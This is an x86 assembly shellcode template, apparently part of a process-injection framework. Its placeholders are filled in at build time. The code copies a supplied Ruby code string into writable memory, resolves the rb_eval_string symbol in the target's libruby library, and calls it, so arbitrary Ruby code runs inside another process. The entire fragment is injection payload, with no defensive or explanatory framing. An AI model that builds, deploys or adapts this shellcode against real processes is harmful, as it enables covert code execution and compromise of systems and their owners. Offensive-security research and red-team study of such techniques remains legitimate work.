// copy the Ruby string to arbitrary read/write memory
	
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	# set ESI to the address of the Ruby code string
	call execute_ruby_code_get_next
execute_ruby_code_get_next:
	pop esi
	add esi, 6
	jmp execute_ruby_code_copy_code

ruby_code:
	.ascii "[VARIABLE:rubycode:VARIABLE]\0"

execute_ruby_code_copy_code:

	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	mov ecx, [VARIABLE:rubycode.length:VARIABLE]
	add ecx, 2												# null terminator
	rep movsb
	// END: copy the Ruby string to arbitrary read/write memory
	
	// BEGIN: call rb_eval_string
	//add esp, 0x10
	
	[INLINE:stack_align-ebx-eax-pre.s:INLINE]
	// keep 16 byte stack alignment
	// function argument count mod 4 == 1, so subtract 0xc
	sub esp, 0xc
	
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	push edi
	mov ebx, [SYMBOL_ADDRESS:^rb_eval_string$:IN_BINARY:.+/libruby[0-9\.so\-]+$:SYMBOL_ADDRESS]
	call ebx
	
	// pop one argument + alignment placeholder off of stack:
	add esp, 0x10
	[INLINE:stack_align-ebx-eax-post.s:INLINE]
	
	//sub esp, 0xc
	// END: call rb_eval_string

SHELLCODE_SECTION_DELIMITER


